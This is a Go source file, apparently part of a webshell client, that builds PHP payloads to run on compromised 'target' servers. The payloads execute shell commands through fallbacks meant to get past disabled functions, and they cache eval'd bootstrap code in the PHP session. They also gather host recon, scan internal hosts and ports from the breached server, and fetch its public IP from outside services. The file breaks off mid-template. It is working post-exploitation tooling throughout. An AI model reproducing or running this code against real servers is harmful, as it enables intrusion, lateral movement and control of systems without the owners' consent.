package shell

import (
	"context"
	"encoding/base64"
	"fmt"
	"sort"
	"strings"
)

// phpShell 是 PHP 类靶机的公共实现，php-eval 与 php-cmd 共用。
// 两者差别仅在：php-eval 支持提交任意 PHP 代码（文件管理等）且命令回显带标记；
// php-cmd 的靶机一句话只 system($_REQUEST['x'])，无法插入标记，且不支持代码执行。
// 具体差异由字段 eval 控制，避免再写 `if o.Type == TypeCmd` 之类分支。
type phpShell struct {
	eval bool
}

func (p phpShell) Type() string {
	if p.eval {
		return TypeEval
	}
	return TypeCmd
}

// Run 执行系统命令：php-eval 夹标记回显；php-cmd 直接提交命令、无标记。
// php-eval 不再写死 passthru：优先 passthru（输出最干净），不可用则按顺序回退到
// system / exec / shell_exec / popen。这样靶机即便在 disable_functions 里禁了
// passthru（甚至只放开其中一个），也能跑命令，而不是因「调用不存在的函数」而 500。
func (p phpShell) Run(ctx context.Context, o ExecOptions, cmd string) Result {
	cmd = strings.TrimSpace(cmd)
	if p.eval {
		start, end := marker(), marker()
		// wsh_run：在靶机侧按可用命令执行函数逐个尝试，输出统一 echo 出来；
		// 全部不可用时打印 WSH_NO_EXEC_FN（仍正常返回，不再致命 500）。
		const runner = `function wsh_utf8($s){if($s===null||$s==='')return $s;if(@preg_match('//u',$s))return $s;$u=@iconv('CP936','UTF-8//IGNORE',$s);if($u!==false&&$u!=='')return $u;return $s;}` +
			`function wsh_run($c){ob_start();` +
			`if(function_exists('passthru')){@passthru($c);}` +
			`elseif(function_exists('system')){@system($c);}` +
			`elseif(function_exists('exec')){@exec($c,$o);echo implode("\n",$o);}` +
			`elseif(function_exists('shell_exec')){echo @shell_exec($c);}` +
			`elseif(function_exists('popen')){$h=@popen($c,'r');if($h){while(!feof($h))echo @fread($h,8192);@pclose($h);}}` +
			`else{echo "WSH_NO_EXEC_FN";}` +
			`$b=ob_get_clean();echo wsh_utf8($b);}`
		payload := fmt.Sprintf("%s;echo %s;wsh_run(%s);echo %s;",
			runner, phpQuote(start), phpQuote(withStderr(cmd)), phpQuote(end))
		return send(ctx, o, payload, start, end)
	}
	// php-cmd：把命令作为值直接提交，回显为响应体原文。
	return send(ctx, o, cmd, "", "")
}

// wrap 把一段 PHP 代码包上标记包裹（error_reporting + ob_start + 随机标记），
// 返回 (payload, start, end)。helpers 由调用方自行拼进 code（见 Code 与会话模块）。
func (p phpShell) wrap(code string) (string, string, string) {
	start, end := marker(), marker()
	payload := "error_reporting(0);ob_start();" + code + ";echo " + phpQuote(start) + ".ob_get_clean()." + phpQuote(end) + ";"
	return payload, start, end
}

// Code 提交一段（eval 型）PHP 代码到靶机，用于文件管理等结构化能力。
// 代码输出被随机标记包裹，便于从响应中精确截取。php-cmd 不支持，返回错误。
func (p phpShell) Code(ctx context.Context, o ExecOptions, code string) Result {
	if !p.eval {
		return Result{Error: "该操作仅支持 php-eval 类型靶机"}
	}
	payload, start, end := p.wrap(wshHelpers + "\n" + code)
	return send(ctx, o, payload, start, end)
}

// bootstrap 返回每次请求随载荷发送的「重水合」前缀（极短）：若靶机会话里已有
// wsh_boot，则本地 eval 出机件函数（不占带宽）；否则 die 出 BOOT_MISSING，由 Go 侧
// 经 bootInstall 补装引导模块后重试。完整的机件函数定义不再每个请求重发。
func (p phpShell) bootstrap() string { return wshBootRehydrate }

// bootInstall 返回把机件函数（wsh_hlp/wsh_store/wsh_mod/wsh_clear）一次性写入靶机会话的
// 指令：自带 session_start 与 base64 解码，故发送时不需要再前缀 wshBootRehydrate。
func (p phpShell) bootInstall() string {
	return "@session_start();$s=base64_decode('" + wshBootSrcB64 + "');@eval($s);$_SESSION['wsh_boot']=$s;@session_write_close();echo '{\"ok\":true}';"
}

// modCall 返回调用某 PHP 模块的短指令（模块源码已缓存在靶机会话中）。
// 第二个参数是 encodeArgs 产出的 PHP 数组字面量（已是源码而非字符串，故不再包引号）。
func (p phpShell) modCall(name, argexpr string) string {
	return "wsh_mod(" + phpQuote(name) + "," + argexpr + ");"
}

// encodeArgs 把参数字典编码为 PHP 数组字面量 array('k'=>'v',...)：键值均经 phpQuote 转义，
// 无 \x1e/\x1f 分隔符，值含控制字符也不会污染解析；空字典产出 array()。
func (p phpShell) encodeArgs(args map[string]any) string {
	if len(args) == 0 {
		return "array()"
	}
	keys := make([]string, 0, len(args))
	for k := range args {
		keys = append(keys, k)
	}
	sort.Strings(keys) // 稳定顺序，便于调试（非必须）
	parts := make([]string, 0, len(keys))
	for _, k := range keys {
		parts = append(parts, phpQuote(k)+"=>"+phpQuote(toStr(args[k])))
	}
	return "array(" + strings.Join(parts, ",") + ")"
}

// modStore 返回把模块源码存入靶机会话的指令：靶机侧 wsh_store 会 base64 解码，故此处先编码。
func (p phpShell) modStore(name, src string) string {
	return "wsh_store(" + phpQuote(name) + "," + phpQuote(base64.StdEncoding.EncodeToString([]byte(src))) + ");"
}

// clearCall 返回清空靶机会话中全部模块缓存的指令。
func (p phpShell) clearCall() string { return "wsh_clear();" }

// Probe 返回 Inspect 探测串：PHP 类原样回显探测标记即可（无害裸字符串）。
func (p phpShell) Probe() string { return inspectMark }

// ---------- 结构化能力：返回靶机 PHP 代码（已转义、已替换占位符） ----------

func (p phpShell) PortScan(host string, ports string) (string, error) {
	return fmt.Sprintf(portScanPHP, phpQuote(host), phpQuote(ports)), nil
}

func (p phpShell) HostScan(hosts string, ports string, probe string) (string, error) {
	return fmt.Sprintf(portScanHostsPHP, phpQuote(hosts), phpQuote(ports), phpQuote(probe)), nil
}

// ---------- PHP 靶机模板（靶机侧实际执行的 PHP 代码） ----------

// monitorPHP 采集靶机的系统资源概览，以 JSON 返回。同时支持 Linux 与 Windows：
// Linux 走 /proc + df + ps；Windows 走 wmic（语言无关，Server 2016 自带）。
// 两分支输出字段完全一致（mem 为字节、cpu.usage 为 0~1、procs.cpu/mem 为百分比），
// 纯读取、不写入；任一数据源不可用时给空值/0 而非报错。
// wshHelpers 定义两个所有 PHP 模板共用的助手，由 phpShell.Code() 统一前置：
//   wsh_exec：按可用度回退的命令执行（shell_exec→exec→system→passthru→popen），
//             避免靶机禁用 shell_exec 时「调用未定义函数」致命崩溃。
//   wsh_json ：健壮的 JSON 编码。中国区 Windows 上 wmic 返回的 CPU 型号 / 进程命令行
//             常含 GBK 编码中文，直接 json_encode 会因非法 UTF-8 返回 false（导致空响应）。
//             wsh_json 先把字符串清洗（剔控制字符、GBK/CP936→UTF-8），再编码；
//             仍失败则用 PARTIAL_OUTPUT_ON_ERROR 兜底，保证永远产出合法 JSON。
const wshHelpers = `function wsh_exec($c){if(function_exists('shell_exec')){$r=@shell_exec($c);if($r!==null)return $r;}if(function_exists('exec')){@exec($c,$o);return implode("\n",$o);}if(function_exists('system')){ob_start();@system($c);return ob_get_clean();}if(function_exists('passthru')){ob_start();@passthru($c);return ob_get_clean();}if(function_exists('popen')){$h=@popen($c,'r');if($h===false)return '';$b='';while(!feof($h))$b.=@fread($h,8192);@pclose($h);return $b;}return '';}
function wsh_json($v){$s=function($x)use(&$s){if(is_string($x)){$x=preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F]/','',$x);if(!@preg_match('//u',$x)){$c=@iconv('CP936','UTF-8//IGNORE',$x);if($c===false||$c==='')$c=@iconv('UTF-8','UTF-8//IGNORE',$x);if($c!==false)$x=$c;}$x=@iconv('UTF-8','UTF-8//IGNORE',$x);return $x===false?'':$x;}if(is_array($x)){$o=array();foreach($x as $k=>$y)$o[$k]=$s($y);return $o;}if(is_object($x))return $s((array)$x);if(is_float($x)&&!is_finite($x))return 0;return $x;};$r=@json_encode($s($v),JSON_UNESCAPED_UNICODE);if($r!==false)return $r;if(defined('JSON_PARTIAL_OUTPUT_ON_ERROR'))return @json_encode($v,JSON_UNESCAPED_UNICODE|JSON_PARTIAL_OUTPUT_ON_ERROR);return '{}';}`

const wshOsName = `function wsh_osname($win,$s=null){$cap='';if($win){if($s===null){$s=wsh_exec('wmic os get Caption /Value 2>&1');}if($s){foreach(explode("\n",$s) as $l){$l=trim($l);if(preg_match('/^Caption\s*=\s*(.+)/i',$l,$x)){$c=trim($x[1]);if($c!==''){$cap=$c;break;}}}}}if($cap!=='')return $cap;$u=(string)@php_uname();if($win){if(preg_match('/\(([^)]*[Ww]indows[^)]*)\)/',$u,$x))return trim($x[1]);if(preg_match('/\b(10\.0|6\.4|6\.3|6\.2|6\.1|5\.2|5\.1)\b/',$u,$x)){$wm=array('10.0'=>'Windows 10 / Server 2016+','6.4'=>'Windows 10','6.3'=>'Windows 8.1 / Server 2012 R2','6.2'=>'Windows 8 / Server 2012','6.1'=>'Windows 7 / Server 2008 R2','5.2'=>'Windows Server 2003','5.1'=>'Windows XP');return $wm[$x[1]];}}return $u;}`

// wshBootSrc 是 PHP 会话模块机制的「机件」函数定义（wsh_hlp / wsh_store / wsh_mod /
// wsh_clear），本身不含 wsh_exec / wsh_json 公共助手。它们被当作一个特殊的引导模块，
// 首次接触靶机时经 bootInstall 存入 $_SESSION['wsh_boot']；之后每次请求只由极短的
// wshBootRehydrate 从会话里 eval 出来（本地读取，不占带宽）。这就是把「函数定义」也塞进
// 「公共模块」缓存的思路：稳态下不再每个请求重发这 800+ 字节的机件，只剩约 110 字节的
// 重水合前缀——与把 _hlp 缓存进会话、不再每请求重发 wsh_exec/wsh_json 是同一套哲学。
//
// 机件自身的协议消息（ok/error）一律用字面量 echo/die，不依赖 wsh_json；只有真正执行的
// 模块才走 wsh_json，且那时 wsh_hlp 早已把 _hlp 加载好。wsh_mod 取模块源码前先 wsh_hlp()
// 保证助手就绪；若 _hlp 尚未存入会话，返回 HELPERS_MISSING，否则模块缺失返回 MODULE_MISSING，
// 均由 Go 侧补存后重试（自愈，无需在 Go 侧维护靶机会话的「已存」状态）。
// wsh_clear 清空全部 wsh_src_* 缓存，但保留 wsh_boot（重水合根基），下次调用仍自愈。
// wsh_mod 的第二个参数双模：既收 encodeArgs 产出的 array 字面量（Go 驱动，首选），
// 也兼容历史上的 \x1e/\x1f 打包串（手写 payload）；两者都归整为 $GLOBALS['wsh_args'] 字典。
const wshBootSrc = `function wsh_hlp(){if(!function_exists('wsh_json')&&isset($_SESSION['wsh_src__hlp'])){@eval($_SESSION['wsh_src__hlp']);}}
function wsh_store($n,$b){$_SESSION['wsh_src_'.$n]=base64_decode($b);@session_write_close();echo '{"ok":true}';}
function wsh_mod($n,$arg){wsh_hlp();$a=array();if(is_array($arg)){$a=$arg;}else if($arg!==''){foreach(explode("\x1e",$arg) as $kv){if($kv==='')continue;$x=explode("\x1f",$kv,2);$a[$x[0]]=isset($x[1])?$x[1]:'';}}$GLOBALS['wsh_args']=$a;$ns=$n;$m='';if(($p=strpos($n,'.'))!==false){$ns=substr($n,0,$p);$m=substr($n,$p+1);}$s=isset($_SESSION['wsh_src_'.$ns])?$_SESSION['wsh_src_'.$ns]:'';@session_write_close();if($s===''){echo '{"ok":false,"error":"'.(function_exists('wsh_json')?'MODULE_MISSING:':'HELPERS_MISSING').$ns.'"}';return;}@eval($s);if($m!==''){$fn='wsh_'.$ns.'_'.$m;if(function_exists($fn)){$fn();}else{echo '{"ok":false,"error":"METHOD_MISSING:'.$n.'"}';}}}
function wsh_clear(){foreach(array_keys($_SESSION) as $k){if($k==='wsh_boot')continue;if(substr($k,0,9)==='wsh_src_'){unset($_SESSION[$k]);}}@session_write_close();echo '{"ok":true}';}`

// wshBootSrcB64 是机件源码的 base64，供 bootInstall 一次性写入靶机会话。
var wshBootSrcB64 = base64.StdEncoding.EncodeToString([]byte(wshBootSrc))

// wshBootRehydrate 是每次请求都随载荷发送的「重水合」前缀：若靶机会话里已有 wsh_boot，
// 则本地 eval 出机件函数（不占带宽）；否则 die 出 BOOT_MISSING，由 Go 侧补装引导模块后重试。
const wshBootRehydrate = `@session_start();if(isset($_SESSION['wsh_boot'])){@eval($_SESSION['wsh_boot']);}else{die('{"ok":false,"error":"BOOT_MISSING"}');}`

// osPHP：轻量系统探测——只返回操作系统与主机名，供选中靶标时快速判定系统类型。
// 相比 monitorPHP 少了内存/CPU/磁盘/进程/网卡/公网IP 等多次 wmic 与外网探测，
// 最多一次 wmic 调用，通常几百毫秒即可返回。
const osPHP = `echo wsh_json(array('ok'=>true,'os'=>wsh_osname(strtoupper(substr(PHP_OS,0,3))==='WIN'),'hostname'=>@gethostname()));`

const monitorPHP = `$win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
$out = array('ok' => true, 'hostname' => @gethostname(), 'os' => @php_uname(), 'uptime' => null, 'loadavg' => array(), 'mem' => array('MemTotal' => 0, 'MemFree' => 0, 'MemAvailable' => 0, 'Buffers' => 0, 'Cached' => 0), 'cpu' => array('cores' => 0, 'model' => '', 'usage' => null), 'disks' => array(), 'procs' => array(), 'intIPs' => array(), 'pubIP' => '');
if ($win) {
  $s = wsh_exec('wmic OS get Caption,TotalVisibleMemorySize,FreePhysicalMemory,LastBootUpTime /Value 2>&1');
  $mt = 0; $mf = 0;
  if ($s) { foreach (explode("\n", $s) as $l) { $l = trim($l); if (preg_match('/^TotalVisibleMemorySize\s*=\s*(\d+)/i', $l, $x)) $mt = intval($x[1]) * 1024; if (preg_match('/^FreePhysicalMemory\s*=\s*(\d+)/i', $l, $x)) $mf = intval($x[1]) * 1024; if (preg_match('/^LastBootUpTime\s*=\s*(\d{14})/', $l, $x)) { $d = $x[1]; $bt = strtotime(substr($d, 0, 4) . '-' . substr($d, 4, 2) . '-' . substr($d, 6, 2) . ' ' . substr($d, 8, 2) . ':' . substr($d, 10, 2) . ':' . substr($d, 12, 2)); if ($bt) $out['uptime'] = time() - $bt; } } }
  $out['mem'] = array('MemTotal' => $mt, 'MemFree' => $mf, 'MemAvailable' => $mf, 'Buffers' => 0, 'Cached' => 0);
  $out['os'] = wsh_osname($win, $s);
  $s = wsh_exec('wmic CPU get Name,NumberOfLogicalProcessors /Value 2>&1');
  $cores = 0; $model = ''; $usage = null;
  if ($s) { foreach (explode("\n", $s) as $l) { $l = trim($l); if (preg_match('/^NumberOfLogicalProcessors\s*=\s*(\d+)/i', $l, $x)) $cores += intval($x[1]); if ($model === '' && preg_match('/^Name\s*=\s*(.+)/i', $l, $x)) $model = trim($x[1]); } }
  if ($cores === 0) $cores = 1;
  // CPU 使用率改走预计算的性能类 Win32_PerfFormattedData_PerfOS_Processor：
  // 实测比 wmic CPU get LoadPercentage 快约 3 倍（0.35s vs 1.1s），指标相同。
  $s = wsh_exec('wmic path Win32_PerfFormattedData_PerfOS_Processor where "Name=\'_Total\'" get PercentProcessorTime /Value 2>&1');
  if ($s) { foreach (explode("\n", $s) as $l) { $l = trim($l); if (preg_match('/^PercentProcessorTime\s*=\s*(\d+)/i', $l, $x)) { $usage = intval($x[1]) / 100; break; } } }
  $out['cpu'] = array('cores' => $cores, 'model' => $model, 'usage' => $usage);
  $s = wsh_exec('wmic LogicalDisk where "DriveType=3" get DeviceID,Size,FreeSpace /Value 2>&1');
  if ($s) { $cur = array(); foreach (explode("\n", $s) as $l) { $l = trim($l); if ($l === '') { if (!empty($cur['fs'])) $out['disks'][] = $cur; $cur = array(); continue; } if (preg_match('/^DeviceID\s*=\s*(.+)/i', $l, $x)) $cur['fs'] = trim($x[1]); if (preg_match('/^Size\s*=\s*(\d+)/i', $l, $x)) $cur['total'] = intval($x[1]); if (preg_match('/^FreeSpace\s*=\s*(\d+)/i', $l, $x)) $cur['avail'] = intval($x[1]); } if (!empty($cur['fs'])) $out['disks'][] = $cur; }
  foreach ($out['disks'] as &$d) { $t = isset($d['total']) ? $d['total'] : 0; $a = isset($d['avail']) ? $d['avail'] : 0; $d['used'] = $t - $a; $d['use'] = $t > 0 ? intval(round(($t - $a) / $t * 100)) : 0; $d['mount'] = $d['fs']; }
  unset($d);
  $s = wsh_exec('wmic process get ProcessId,Name,CommandLine,WorkingSetSize /Value 2>&1');
  if ($s) { $cur = array(); foreach (explode("\n", $s) as $l) { $l = trim($l); if ($l === '') { if (isset($cur['pid'])) $out['procs'][] = $cur; $cur = array(); continue; } if (preg_match('/^ProcessId\s*=\s*(\d+)/i', $l, $x)) $cur['pid'] = $x[1]; if (preg_match('/^Name\s*=\s*(.+)/i', $l, $x)) $cur['cmd'] = trim($x[1]); if (preg_match('/^CommandLine\s*=\s*(.*)/i', $l, $x)) { $v = trim($x[1]); if ($v !== '') $cur['cmd'] = $v; } if (preg_match('/^WorkingSetSize\s*=\s*(\d+)/i', $l, $x)) $cur['ws'] = intval($x[1]); } if (isset($cur['pid'])) $out['procs'][] = $cur; }
  foreach ($out['procs'] as &$p) { $ws = isset($p['ws']) ? $p['ws'] : 0; $p['mem'] = $mt > 0 ? round($ws / $mt * 100, 1) : 0; $p['cpu'] = 0; $p['user'] = ''; if (!isset($p['cmd'])) $p['cmd'] = ''; unset($p['ws']); }
  unset($p);
  $s = wsh_exec('wmic nicconfig where "IPEnabled=TRUE" get IPAddress /Value 2>&1');
  if ($s) { foreach (explode("\n", $s) as $l) { $l = trim($l); if (preg_match('/^IPAddress\s*=\s*(.+)/i', $l, $x)) { $v = trim($x[1], '{}'); foreach (explode(',', $v) as $ip) { $ip = trim($ip, '" '); if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false && strpos($ip, '169.254.') !== 0) $out['intIPs'][] = $ip; } } } }
  $out['intIPs'] = array_values(array_unique($out['intIPs']));
} else {
  $mem = array(); $s = @file_get_contents('/proc/meminfo'); if ($s) { foreach (explode("\n", $s) as $l) { if (preg_match('/^(\w+):\s+(\d+)\s*kB/', $l, $x)) $mem[$x[1]] = intval($x[2]) * 1024; } }
  $cores = 0; $model = ''; $c = @file_get_contents('/proc/cpuinfo'); if ($c) { foreach (explode("\n", $c) as $l) { if (stripos($l, 'processor') === 0) $cores++; if ($model === '' && stripos($l, 'model name') === 0) { $a = explode(':', $l, 2); $model = trim($a[1]); } } }
  $usage = null; $st = @file_get_contents('/proc/stat'); if ($st) { foreach (explode("\n", $st) as $l) { if (strpos($l, 'cpu ') === 0) { $f = preg_split('/\s+/', trim($l)); array_shift($f); $sum = 0; $idle = 0; foreach ($f as $i => $v) { $sum += intval($v); if ($i == 3 || $i == 4) $idle += intval($v); } $usage = $sum > 0 ? (1 - $idle / $sum) : 0; break; } } }
  $la = array(); $u = @file_get_contents('/proc/loadavg'); if ($u) { $p = preg_split('/\s+/', trim($u)); $la = array(@$p[0], @$p[1], @$p[2]); }
  $ds = array(); $raw2 = wsh_exec('df -P -k 2>&1'); if ($raw2) { $ls2 = explode("\n", $raw2); array_shift($ls2); foreach ($ls2 as $ln) { $ln = trim($ln); if ($ln === '') continue; if (preg_match('/^(\S+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)%\s+(.+)$/', $ln, $m)) $ds[] = array('fs' => $m[1], 'total' => intval($m[2]) * 1024, 'used' => intval($m[3]) * 1024, 'avail' => intval($m[4]) * 1024, 'use' => intval($m[5]), 'mount' => trim($m[6])); } }
  $ps = array(); $raw = wsh_exec('ps -eo pid,user,pcpu,pmem,comm 2>&1'); if ($raw) { $ls = explode("\n", trim($raw)); array_shift($ls); foreach ($ls as $ln) { $ln = trim($ln); if ($ln === '') continue; $f = preg_split('/\s+/', $ln); if (count($f) >= 5) $ps[] = array('pid' => $f[0], 'user' => $f[1], 'cpu' => floatval($f[2]), 'mem' => floatval($f[3]), 'cmd' => $f[4]); } }
  $ips = array(); $ft = @file_get_contents('/proc/net/fib_trie'); if ($ft) { foreach (explode("\n", $ft) as $ln) { if (preg_match('/\S+\s+([0-9.]+)\/32 host/', $ln, $m)) { $ip = $m[1]; if (strpos($ip, '127.') !== 0 && strpos($ip, '169.254.') !== 0) $ips[] = $ip; } } }
  $ips = array_values(array_unique($ips)); if (empty($ips)) { $g = @gethostbyname(@gethostname()); if ($g) $ips[] = $g; }
  $out['mem'] = $mem; $out['cpu'] = array('cores' => $cores, 'model' => $model, 'usage' => $usage); $out['loadavg'] = $la; $out['disks'] = $ds; $out['procs'] = $ps; $out['intIPs'] = $ips; $out['uptime'] = @file_get_contents('/proc/uptime');
}
$pub = ''; $pubErr = '';
function wsh_get($u){ $ctx=@stream_context_create(array('http'=>array('timeout'=>3,'ignore_errors'=>true),'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false))); $r=@file_get_contents($u,false,$ctx); return $r===false?false:rtrim($r); }
function wsh_pubip($u){ $r = wsh_get($u); if ($r === false) return ''; $r = trim($r); if (preg_match('/^IP\s*:\s*([0-9a-fA-F\.:]+)/m', $r, $m)) return trim($m[1]); if (filter_var($r, FILTER_VALIDATE_IP)) return $r; return ''; }
// 顺序很讲究：整体耗时几乎全花在「等超时」上，要让最可能秒失败/秒成功的排在前面。
// 1) PHP 直连 HTTPS。openssl 未启用时 HTTPS 必然失败，先判断再试，别白等。
if (extension_loaded('openssl')) { foreach (array('https://cip.cc','https://icanhazip.com','https://ipconfig.io') as $u) { $pub = wsh_pubip($u); if ($pub !== '') break; } }
if ($pub === '') {
  // 2) PHP 侧取不到（openssl 未启用 / allow_url_fopen=Off / 纯内网无出网），
  //    改用系统自带工具经系统代理出网（不依赖 PHP 的 openssl）。
  $c = wsh_exec('powershell -NoP -Command "try{(Invoke-WebRequest -UseBasicParsing -TimeoutSec 3 https://icanhazip.com).Content}catch{exit 1}" 2>&1');
  if ($c !== '' && $c !== false) { $c = trim($c); if (filter_var($c, FILTER_VALIDATE_IP)) $pub = $c; }
}
if ($pub === '') {
  $c = wsh_exec('curl -s --max-time 3 https://icanhazip.com 2>&1');
  if ($c !== '' && $c !== false) { $c = trim($c); if (filter_var($c, FILTER_VALIDATE_IP)) $pub = $c; }
}
if ($pub === '') { $pub = wsh_pubip('http://cip.cc'); }
if ($pub === '') { $pubErr = '靶机无法出网获取公网IP：可能无外网/防火墙拦截，或 PHP 未启用 openssl/allow_url_fopen，且系统无可用 curl/powershell'; }
$out['pubIP'] = $pub;
$out['pubErr'] = $pubErr;
echo wsh_json($out);`

// procPHP 采集靶机进程列表（含父进程 PID 与完整命令行），用于进程树展示。
// 同时支持 Linux（ps）与 Windows（wmic），纯读取、不写入；数据源不可用时给空列表而非报错。
// 字段：pid / ppid / user / cpu(%) / mem(%) / cmd。Windows 下 user 暂为空（wmic 取属主较繁琐），
// 单进程 CPU(%) 在 Windows 上无即时值，给 0。
const procPHP = `$win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
$ps = array();
if ($win) {
  $mt = 0; $s = wsh_exec('wmic OS get TotalVisibleMemorySize /Value 2>&1'); if ($s) { foreach (explode("\n", $s) as $l) { $l = trim($l); if (preg_match('/^TotalVisibleMemorySize\s*=\s*(\d+)/i', $l, $x)) $mt = intval($x[1]) * 1024; } }
  $s = wsh_exec('wmic process get ProcessId,ParentProcessId,Name,CommandLine,WorkingSetSize /Value 2>&1');
  if ($s) { $cur = array(); foreach (explode("\n", $s) as $l) { $l = trim($l); if ($l === '') { if (isset($cur['pid'])) { $ws = isset($cur['ws']) ? $cur['ws'] : 0; $ps[] = array('pid' => $cur['pid'], 'ppid' => isset($cur['ppid']) ? $cur['ppid'] : '0', 'user' => '', 'cpu' => 0, 'mem' => $mt > 0 ? round($ws / $mt * 100, 1) : 0, 'cmd' => isset($cur['cmd']) ? $cur['cmd'] : ''); } $cur = array(); continue; } if (preg_match('/^ProcessId\s*=\s*(\d+)/i', $l, $x)) $cur['pid'] = $x[1]; if (preg_match('/^ParentProcessId\s*=\s*(\d+)/i', $l, $x)) $cur['ppid'] = $x[1]; if (preg_match('/^Name\s*=\s*(.+)/i', $l, $x)) $cur['cmd'] = trim($x[1]); if (preg_match('/^CommandLine\s*=\s*(.*)/i', $l, $x)) { $v = trim($x[1]); if ($v !== '') $cur['cmd'] = $v; } if (preg_match('/^WorkingSetSize\s*=\s*(\d+)/i', $l, $x)) $cur['ws'] = intval($x[1]); } if (isset($cur['pid'])) { $ws = isset($cur['ws']) ? $cur['ws'] : 0; $ps[] = array('pid' => $cur['pid'], 'ppid' => isset($cur['ppid']) ? $cur['ppid'] : '0', 'user' => '', 'cpu' => 0, 'mem' => $mt > 0 ? round($ws / $mt * 100, 1) : 0, 'cmd' => isset($cur['cmd']) ? $cur['cmd'] : ''); } }
} else {
  $raw = wsh_exec('ps -eo pid,ppid,user,pcpu,pmem,args 2>&1');
  if ($raw) { $ls = explode("\n", rtrim($raw)); array_shift($ls); foreach ($ls as $ln) { $ln = rtrim($ln); if ($ln === '') continue; if (preg_match('/^\s*(\d+)\s+(\d+)\s+(\S+)\s+([\d.]+)\s+([\d.]+)\s+(.*)$/', $ln, $m)) $ps[] = array('pid' => $m[1], 'ppid' => $m[2], 'user' => $m[3], 'cpu' => floatval($m[4]), 'mem' => floatval($m[5]), 'cmd' => $m[6]); } }
}
echo wsh_json(array('ok' => true, 'procs' => $ps));`

// portsPHP 解析 /proc/net/tcp(6) 里的 LISTEN 套接字（状态 0A），并把 socket inode
// 通过 /proc/*/fd 软链映射到所属进程。纯读取内核结构，不依赖 ss / netstat，
// 字段缺失时给空值而非报错。16 进制地址按小端字节序还原为可读 IP。
const portsPHP = `foreach (array('/proc/net/tcp', '/proc/net/tcp6') as $f) {
  $s = @file_get_contents($f);
  if ($s === false) continue;
  $v6 = basename($f) === 'tcp6';
  foreach (explode("\n", $s) as $ln) {
    $ln = trim($ln);
    if ($ln === '') continue;
    $c = preg_split('/\s+/', $ln);
    if (count($c) < 10) continue;
    if ($c[3] !== '0A') continue;
    $lp = explode(':', $c[1], 2);
    $ports[] = array('proto' => $v6 ? 'tcp6' : 'tcp', 'addr' => hxaddr($lp[0], $v6), 'port' => hexdec($lp[1]), 'inode' => $c[9], 'pid' => '', 'comm' => '');
  }
}
foreach ($ports as &$p) {
  if ($p['inode'] !== '' && $p['inode'] !== '0') { list($p['pid'], $p['comm']) = inodetoproc($p['inode']); }
}
unset($p);
echo wsh_json(array('ok' => true, 'ports' => $ports));
function hxaddr($h, $v6) {
  $h = str_pad($h, $v6 ? 32 : 8, '0', STR_PAD_LEFT);
  $raw = strrev(hex2bin($h));
  $r = @inet_ntop($raw);
  return $r !== false ? $r : $h;
}
function inodetoproc($inode) {
  $pid = ''; $comm = '';
  $dh = @opendir('/proc');
  if ($dh === false) return array($pid, $comm);
  while (($pd = readdir($dh)) !== false) {
    if (!ctype_digit($pd)) continue;
    $fdh = @opendir('/proc/' . $pd . '/fd');
    if ($fdh === false) continue;
    while (($fd = readdir($fdh)) !== false) {
      $link = @readlink('/proc/' . $pd . '/fd/' . $fd);
      if ($link === 'socket:[' . $inode . ']') {
        $cm = @file_get_contents('/proc/' . $pd . '/comm');
        $pid = $pd; $comm = $cm !== false ? trim($cm) : '';
        closedir($fdh); closedir($dh);
        return array($pid, $comm);
      }
    }
    closedir($fdh);
  }
  closedir($dh);
  return array($pid, $comm);
}`

// portScanPHP 对目标主机做 TCP 端口探测：用 fsockopen 对每个端口尝试连接，
// 连接成功（得到资源句柄）即视为开放。超时 2 秒，避免单个过滤端口拖垮整体。
const portScanPHP = `$host = %s;
$ports = explode(',', %s);
$results = array();
$st = microtime(true);
foreach ($ports as $p) {
  $p = trim($p);
  if ($p === '') continue;
  $errno = 0; $errstr = '';
  $fp = @fsockopen($host, (int)$p, $errno, $errstr, 2);
  if (!is_resource($fp)) { $fp = @stream_socket_client("tcp://" . $host . ":" . (int)$p, $errno, $errstr, 2); }
  $open = is_resource($fp);
  if ($open) fclose($fp);
  $results[] = array('port' => (int)$p, 'open' => $open);
}
echo wsh_json(array('ok' => true, 'host' => $host, 'ports' => $results, 'elapsed' => microtime(true) - $st));`

// portScanHostsPHP 对内网多台主机做 TCP 端口探测：先用一组常见端口短超时做存活探测，
// 在线主机再扫描完整端口列表。fsockopen 连接成功（得到资源句柄）即视为开放。
const portScanHostsPHP = `function _wsh_try($host, $port, $to) {
  $errno = 0; $errstr = '';
  $fp = @fsockopen($host, (int)$port, $errno, $errstr, $to);
  if (!is_resource($fp)) { $fp = @stream_socket_client("tcp://" . $host . ":" . (int)$port, $errno, $errstr, $to); }
  $open = is_resource($fp);
  if ($open) fclose($fp);
  return $open;
}
$hosts = explode('|', %s);
$ports = explode(',', %s);
$probe = explode(',', %s);
$results = array();
$st = microtime(true);
foreach ($hosts as $h) {
  $h = trim($h);
  if ($h === '') continue;
  $up = false;
  foreach ($probe as $pr) {
    $pr = trim($pr);
    if ($pr === '') continue;
    if (_wsh_try($h, $pr, 0.4)) { $up = true; break; }
  }
  $opj = array();
  if ($up) {
    foreach ($ports as $p) {
      $p = trim($p);
      if ($p === '') continue;
      if (_wsh_try($h, $p, 0.8)) $opj[] = (int)$p;
    }
  }
  $results[] = array('host' => $h, 'alive' => $up, 'ports' => $opj);
}
echo wsh_json(array('ok' => true, 'hosts' => $results, 'elapsed' => microtime(true) - $st));`

// phpInfoPHP 收集 phpinfo 中与「能力短板」相关的关键项：版本 / SAPI / 被禁用的函数、
// open_basedir / allow_url_include 等受限配置，并直接判定命令执行函数是否可用。
// 以 JSON 返回，前端据此给出「还能执行命令吗 / 文件访问受限吗」的研判。
const phpInfoPHP = `$df = preg_split('/[,\s]+/', strtolower(trim(ini_get('disable_functions'))), -1, PREG_SPLIT_NO_EMPTY);
$execFns = array('exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'pcntl_exec');
$execAvailable = array();
foreach ($execFns as $fn) { $execAvailable[$fn] = function_exists($fn) && !in_array($fn, $df, true); }
$anyExec = in_array(true, array_values($execAvailable), true);
$out = array(
  'ok' => true,
  'version' => PHP_VERSION,
  'sapi' => php_sapi_name(),
  'os' => PHP_OS,
  'disabledFunctions' => $df,
  'disableClasses' => trim(ini_get('disable_classes')),
  'openBasedir' => trim(ini_get('open_basedir')),
